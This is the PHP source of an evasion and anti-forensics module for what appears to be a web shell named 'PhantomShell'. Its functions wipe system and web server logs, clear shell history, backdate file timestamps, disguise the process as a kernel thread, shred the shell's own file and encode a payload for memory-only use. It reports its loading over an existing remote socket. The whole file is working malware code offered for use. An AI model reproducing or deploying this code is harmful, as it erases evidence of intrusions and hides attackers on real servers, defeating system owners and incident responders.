<?php
// PhantomShell Module: Evasion & Anti-Forensics
// Load via MINIMAL mode: fetch evasion

function mod_clean_logs() {
    $cleaned = array();
    $logs = array('/var/log/auth.log', '/var/log/syslog', '/var/log/messages',
        '/var/log/secure', '/var/log/apache2/access.log', '/var/log/apache2/error.log',
        '/var/log/nginx/access.log', '/var/log/nginx/error.log',
        '/var/log/wtmp', '/var/log/btmp');
    foreach ($logs as $l) {
        if (file_exists($l) && is_writable($l)) {
            @file_put_contents($l, '');
            $cleaned[] = $l;
        }
    }
    if(function_exists('shell_exec')) @shell_exec('history -c; >~/.bash_history 2>/dev/null');
    return $cleaned;
}

function mod_timestomp($file, $ref = null) {
    if ($ref && file_exists($ref)) {
        if(function_exists('shell_exec')) @shell_exec("touch -r " . escapeshellarg($ref) . " " . escapeshellarg($file));
    } else {
        if(function_exists('shell_exec')) @shell_exec("touch -t 202001010000 " . escapeshellarg($file));
    }
    return true;
}

function mod_hide_process() {
    $titles = array('[kworker/0:2]', '[migration/0]', '[kthreadd]', '[rcu_preempt]');
    $t = $titles[crc32(__FILE__) % count($titles)];
    if (function_exists('cli_set_process_title')) @cli_set_process_title($t);
    return $t;
}

function mod_self_destruct($file) {
    if(function_exists('shell_exec')) @shell_exec("shred -vfz -n 3 " . escapeshellarg($file) . " 2>&1");
    if (file_exists($file)) @unlink($file);
    return !file_exists($file);
}

function mod_memory_only_payload($source_file) {
    $src = @file_get_contents($source_file);
    if (!$src) return false;
    return base64_encode($src);
}

if (isset($sock)) {
    @fwrite($sock, "  Evasion module loaded.\n");
    @fwrite($sock, "  Functions: mod_clean_logs, mod_timestomp, mod_hide_process, mod_self_destruct, mod_memory_only_payload\n");
}
?>
